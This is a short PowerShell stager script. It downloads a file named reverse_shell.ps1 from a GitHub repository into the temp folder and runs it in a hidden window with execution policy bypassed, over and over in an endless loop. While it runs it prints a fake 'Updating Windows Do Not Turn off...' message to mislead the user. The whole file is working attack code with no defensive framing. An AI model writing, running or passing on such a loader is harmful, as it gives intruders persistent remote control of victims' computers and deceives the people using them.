# Loop to download the PowerShell script file and run it every 10 seconds
$scriptUrl = "https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reverse_shell.ps1"
$scriptPath = "$env:TEMP\reverse_shell.ps1"

# Download the reverse shell script initially
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Infinite loop to execute the downloaded PowerShell script
while ($true) {
  
    # Run the downloaded PowerShell script in a hidden window
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File ${scriptPath}" -WindowStyle Hidden
    Write-Host "Updating Windows Do Not Turn off..."
    Start-Sleep -Seconds 30
}

# Exit the script
exit
 